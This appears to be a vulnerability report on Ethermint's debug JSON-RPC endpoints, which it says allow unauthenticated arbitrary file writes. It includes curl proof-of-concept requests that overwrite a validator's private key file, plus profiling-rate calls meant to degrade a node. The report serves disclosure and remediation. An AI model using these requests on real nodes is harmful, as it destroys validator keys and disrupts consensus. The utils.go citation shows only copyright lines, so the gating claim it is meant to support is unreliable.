### Title
Debug RPC Namespace Registered as `Public: true` with `RestrictUserInput=false` Default Enables Arbitrary File Write via Unauthenticated JSON-RPC — (`File: rpc/apis.go`, `rpc/namespaces/ethereum/debug/api.go`, `server/start.go`)

---

### Summary

The Ethermint JSON-RPC `debug` namespace is unconditionally registered with `Public: true`, and the `json-rpc.restrict-user-input` flag that gates path validation for file-writing debug endpoints defaults to `false`. An unauthenticated remote caller can invoke `debug_startCPUProfile`, `debug_cpuProfile`, `debug_blockProfile`, `debug_goTrace`, `debug_writeBlockProfile`, `debug_writeMemProfile`, and `debug_writeMutexProfile` with attacker-controlled file paths, writing profiling data to arbitrary filesystem locations accessible to the node process. This can overwrite critical node files (private validator key, genesis, application DB), causing chain halt or consensus failure.

---

### Finding Description

**Root cause 1 — Debug namespace is `Public: true`**

In `rpc/apis.go`, the `DebugNamespace` creator registers the service with `Public: true`: [1](#0-0) 

Compare this to the `PersonalNamespace`, which is correctly set to `Public: false`: [2](#0-1) 

Setting `Public: true` means the go-ethereum RPC server exposes every method in the `debug.*` namespace to any caller without authentication.

**Root cause 2 — `RestrictUserInput` defaults to `false`**

The flag `json-rpc.restrict-user-input` is registered with a default of `false`: [3](#0-2) 

The inline comment reads: *"must be set to true if serving debug namespace to the public"* — yet the default is the unsafe value. The `validatePath` and `restrictedCreate` helpers in `rpc/namespaces/ethereum/debug/utils.go` are gated on this flag: [4](#0-3) 

When `RestrictUserInput=false`, path validation is not enforced, so the caller-supplied `file` argument is used directly.

**Root cause 3 — File-writing debug endpoints accept caller-controlled paths**

Multiple methods in `rpc/namespaces/ethereum/debug/api.go` accept a `file string` argument and write profiling data to it: [5](#0-4) [6](#0-5) [7](#0-6) [8](#0-7) 

With `RestrictUserInput=false`, `restrictedCreate` opens the attacker-supplied path without restriction, allowing writes anywhere the node process has filesystem access.

**Root cause 4 — CORS is a non-barrier**

The `corsHandler` only applies permissive CORS when `EnableUnsafeCORS=true`; it does not restrict access otherwise — it simply omits CORS headers. The JSON-RPC endpoint itself remains reachable from any HTTP client (e.g., `curl`), not just browsers: [9](#0-8) 

---

### Impact Explanation

An unauthenticated attacker with network access to the JSON-RPC port can:

1. Call `debug_startCPUProfile` with `file = "<node_home>/config/priv_validator_key.json"` — overwriting the private validator key with pprof binary data, permanently disabling the validator and halting consensus participation.
2. Call `debug_writeMemProfile` or `debug_blockProfile` targeting application DB files, corrupting committed state.
3. Call `debug_setBlockProfileRate(1000000)` or `debug_setMutexProfileFraction(1000000)` to impose extreme profiling overhead, degrading node throughput to the point of liveness failure.

This matches the allowed impact: *"Valid unprivileged RPC submission can halt the chain, corrupt committed state, or cause deterministic validator consensus failure."*

---

### Likelihood Explanation

- The JSON-RPC port (`127.0.0.1:8545` by default) is often exposed publicly on validator and RPC nodes in production deployments.
- No authentication, API key, or IP allowlist is enforced at the Ethermint layer.
- The unsafe default (`RestrictUserInput=false`) is silently inherited by every operator who does not explicitly set the flag.
- The attack requires only a single unauthenticated HTTP POST — no special tooling, no on-chain transaction, no gas.

---

### Recommendation

1. **Change `Public` to `false` for the `DebugNamespace`** in `rpc/apis.go` (line 174), consistent with `PersonalNamespace`. The go-ethereum RPC server will then refuse to serve `debug_*` methods to unauthenticated callers.
2. **Flip the default of `JSONRPCRestrictUserInput` to `true`** in `server/start.go` (line 232). Operators who need unrestricted paths in a controlled environment can explicitly opt out.
3. **Exclude `debug` from `GetDefaultAPINamespaces()`** in `server/config/config.go` so operators must consciously opt in to exposing the debug namespace, mirroring the external report's fix of excluding development endpoints from production builds by default.
4. Add a startup warning log if `debug` is enabled and `RestrictUserInput=false`.

---

### Proof of Concept

```bash
# Overwrite the private validator key with CPU profile binary data
curl -s -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{
    "jsonrpc":"2.0",
    "method":"debug_startCPUProfile",
    "params":["<node_home>/config/priv_validator_key.json"],
    "id":1
  }'

# Wait a moment, then stop — key file is now corrupted
curl -s -X POST http://<node>:8545 \
  -H "Content-Type: application/json" \
  -d '{"jsonrpc":"2.0","method":"debug_stopCPUProfile","params":[],"id":2}'
```

No authentication, no on-chain transaction, no gas required. The node's private validator key is overwritten with pprof binary data; the validator can no longer sign blocks and is effectively halted.

### Citations

**File:** rpc/apis.go (L136-143)
```go
			return []rpc.API{
				{
					Namespace: PersonalNamespace,
					Version:   apiVersion,
					Service:   personal.NewAPI(ctx.Logger, evmBackend),
					Public:    false,
				},
			}
```

**File:** rpc/apis.go (L161-177)
```go
		DebugNamespace: func(ctx *server.Context,
			clientCtx client.Context,
			_ *stream.RPCStream,
			allowUnprotectedTxs bool,
			indexer ethermint.EVMTxIndexer,
			mempoolClient appmempool.MempoolClient,
		) []rpc.API {
			evmBackend := backend.NewBackend(ctx, ctx.Logger, clientCtx, allowUnprotectedTxs, indexer, backend.WithMempoolClient(mempoolClient))
			return []rpc.API{
				{
					Namespace: DebugNamespace,
					Version:   apiVersion,
					Service:   debug.NewAPI(ctx, evmBackend),
					Public:    true,
				},
			}
		},
```

**File:** server/start.go (L232-232)
```go
	cmd.Flags().Bool(srvflags.JSONRPCRestrictUserInput, false, "Restrict some user input to the JSON-RPC debug apis, must be set to true if serving debug namespace to the public") //nolint:lll
```

**File:** rpc/namespaces/ethereum/debug/utils.go (L1-2)
```go
// Copyright 2021 Evmos Foundation
// This file is part of Evmos' Ethermint library.
```

**File:** rpc/namespaces/ethereum/debug/api.go (L163-174)
```go
func (a *API) BlockProfile(file string, nsec uint) error {
	d, err := parseDuration(nsec)
	if err != nil {
		return err
	}
	a.logger.Debug("debug_blockProfile", "file", file, "nsec", nsec)
	runtime.SetBlockProfileRate(1)
	defer runtime.SetBlockProfileRate(0)

	time.Sleep(d)
	return writeProfile("block", file, a.ctx, a.logger)
}
```

**File:** rpc/namespaces/ethereum/debug/api.go (L178-189)
```go
func (a *API) CpuProfile(file string, nsec uint) error { //nolint: revive
	d, err := parseDuration(nsec)
	if err != nil {
		return err
	}
	a.logger.Debug("debug_cpuProfile", "file", file, "nsec", nsec)
	if err := a.StartCPUProfile(file); err != nil {
		return err
	}
	time.Sleep(d)
	return a.StopCPUProfile()
}
```

**File:** rpc/namespaces/ethereum/debug/api.go (L241-278)
```go
func (a *API) StartCPUProfile(file string) error {
	a.logger.Debug("debug_startCPUProfile", "file", file)
	a.handler.mu.Lock()
	defer a.handler.mu.Unlock()

	switch {
	case isCPUProfileConfigurationActivated(a.ctx):
		a.logger.Debug("CPU profiling already in progress using the configuration file")
		return errors.New("CPU profiling already in progress using the configuration file")
	case a.handler.cpuFile != nil:
		a.logger.Debug("CPU profiling already in progress")
		return errors.New("CPU profiling already in progress")
	default:
		fp, err := validatePath(a.ctx, file)
		if err != nil {
			a.logger.Debug("failed to get filepath for the CPU profile file", "error", err.Error())
			return err
		}
		f, err := restrictedCreate(a.ctx, fp)
		if err != nil {
			a.logger.Debug("failed to create CPU profile file", "error", err.Error())
			return err
		}
		if err := pprof.StartCPUProfile(f); err != nil {
			a.logger.Debug("cpu profiling already in use", "error", err.Error())
			if err := f.Close(); err != nil {
				a.logger.Debug("failed to close cpu profile file")
				return stderrors.Wrap(err, "failed to close cpu profile file")
			}
			return err
		}

		a.logger.Info("CPU profiling started", "profile", file)
		a.handler.cpuFile = f
		a.handler.cpuFilename = file
		return nil
	}
}
```

**File:** rpc/namespaces/ethereum/debug/api.go (L307-318)
```go
func (a *API) WriteBlockProfile(file string) error {
	a.logger.Debug("debug_writeBlockProfile", "file", file)
	return writeProfile("block", file, a.ctx, a.logger)
}

// WriteMemProfile writes an allocation profile to the given file.
// Note that the profiling rate cannot be set through the API,
// it must be set on the command line.
func (a *API) WriteMemProfile(file string) error {
	a.logger.Debug("debug_writeMemProfile", "file", file)
	return writeProfile("heap", file, a.ctx, a.logger)
}
```

**File:** server/json_rpc.go (L183-188)
```go
// corsHandler enables permissive CORS only when opted in, otherwise no CORS headers are set.
func corsHandler(r http.Handler, enableUnsafeCORS bool) http.Handler {
	if enableUnsafeCORS {
		return cors.AllowAll().Handler(r)
	}
	return r
```
